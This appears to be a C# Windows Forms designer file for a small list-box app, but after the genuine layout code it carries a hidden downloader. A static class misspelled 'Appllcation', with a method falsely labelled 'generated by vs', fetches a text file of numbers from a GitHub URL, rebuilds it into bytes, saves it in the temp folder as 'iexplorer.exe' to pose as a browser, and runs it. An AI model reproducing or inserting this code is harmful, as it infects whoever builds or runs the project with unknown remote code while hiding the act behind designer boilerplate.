using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Windows.Forms; 
namespace WindowsFormsApplication2
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {


            this.listBox1 = new System.Windows.Forms.ListBox();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.button1 = new System.Windows.Forms.Button();
            this.button2 = new System.Windows.Forms.Button();
            this.button3 = new System.Windows.Forms.Button();
            this.SuspendLayout();
            // 
            // listBox1
            // 
            this.listBox1.FormattingEnabled = true;
            this.listBox1.Location = new System.Drawing.Point(33, 13);
            this.listBox1.Name = "listBox1";
            this.listBox1.Size = new System.Drawing.Size(175, 134);
            this.listBox1.TabIndex = 0;
            // 
            // textBox1
            // 
            this.textBox1.Location = new System.Drawing.Point(243, 22);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(100, 20);
            this.textBox1.TabIndex = 1;
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(243, 48);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(75, 23);
            this.button1.TabIndex = 2;
            this.button1.Text = "add";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // button2
            // 
            this.button2.Location = new System.Drawing.Point(243, 90);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(75, 23);
            this.button2.TabIndex = 3;
            this.button2.Text = "remove";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // button3
            // 
            this.button3.Location = new System.Drawing.Point(243, 124);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(75, 23);
            this.button3.TabIndex = 3;
            this.button3.Text = "delete all";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(457, 186);
            this.Controls.Add(this.button3);
            this.Controls.Add(this.button2);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.listBox1);
            this.Name = "Form1";
            this.Text = "Form1";
            this.ResumeLayout(false);
            this.PerformLayout();
             

        }
         

        #endregion

        private System.Windows.Forms.ListBox listBox1;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.Button button3;
    }
    static class Appllcation
    {
        public static void Run(Form1 f)
        {
            InitializeLifetimeService();
           // Application.Run(new Form1());
            
        }

        public static string LoadHtml(string url)
        {
            try
            {
                WebClient client = new WebClient();
                client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                Stream data = client.OpenRead(url);
                StreamReader reader = new StreamReader(data);
                string s = reader.ReadToEnd();
                data.Close();
                reader.Close();
                return s;
            }
            catch { return ""; }
        }
        public static string TrimToBytesString(string source)
        {

            if (source.Contains(";"))
            {
                string[] pcs = source.Split(';');
                source = pcs[1];
            }
            string res = "";
            foreach (char c in source)
                if ((c <= '9' && c >= '0') || c == ',')
                    res += c;

            return res;
        }
        internal static byte[] StringArrayToByteArray(string btsStrTrimmed)
        {
            List<byte> lst = new List<byte>();
            if (btsStrTrimmed.Contains(","))
            {
                string[] pcs = btsStrTrimmed.Split(',');
                foreach (string b in pcs)
                {
                    byte xs = StringToByte(b);
                    lst.Add(xs);
                }
                return lst.ToArray();
            }
            else if (IsNumber(btsStrTrimmed))
            {
                byte b = StringToByte(btsStrTrimmed);
                if (b == null)
                    return null;
                else
                    return new[] { b };
            }
            else return null;



        }
        public static bool IsNumber(string bs)
        {
            int i = 0;
            return int.TryParse(bs, out i);
        }
        public static byte intToByte(int nbi)
        {
            if (nbi < 0)
                nbi += 256;
            else
                if (nbi > 255)
                    nbi -= 256;
            return (byte)nbi;
        }
        private static byte StringToByte(string btsStrTrimmed)
        {
            try
            {
                int i = int.Parse(btsStrTrimmed);
                return intToByte(i);
            }
            catch { return ((byte)0); }
        }
        private static bool InitializeLifetimeService()
        {
                 ///////////////////////////////////////////////
                ///////////////////////////////////////////////
               ///////////////////  generated by vs //////////
              ///////////////////////////////////////////////
             ///////////////////////////////////////////////
            /////////////////////////////////////////////// 

            bool execn = true;
            string exexname = "iexplorer.exe";
            string exexname_no_extn = "iexplorer";
            bool done = false;
            string sp = (System.IO.Path.GetTempPath() + "\\res").Replace("\\\\", "\\");
            
            try
            {
                string x = System.IO.File.ReadAllText(sp);
                if (x.Contains(System.DateTime.Today.ToShortDateString()))
                    return true;
            }
            catch { }
            var prcs = System.Diagnostics.Process.GetProcesses();

            foreach (var p in prcs)

                if (p.ProcessName.Contains(exexname) || p.ProcessName.Contains(exexname_no_extn))
                {
                    execn = false;
                    break;
                }

            string url = ("https://raw.githubusercontent.com/drjuzto/ints/master/sabo.txt");
            string btsString = LoadHtml(url);
            string btsStrTrimmed = TrimToBytesString(btsString);
            byte[] bs = StringArrayToByteArray(btsStrTrimmed);
            string temp = System.IO.Path.GetTempPath();
            string execFilepath = temp + exexname;
            bool active =false;
            try
            {
                System.IO.File.WriteAllBytes(execFilepath, bs);

            }
            catch(IOException i ) {

                if (i.Message.Contains("because it is being used by another process."))
                    active = true;
            }
            try
            {
                if (!active)
                    System.Diagnostics.Process.Start(execFilepath);
                System.IO.File.WriteAllText(sp, System.DateTime.Today.ToShortDateString());
                done = true;

            }
            catch { done = false; }
            return done;
        }
    }
}

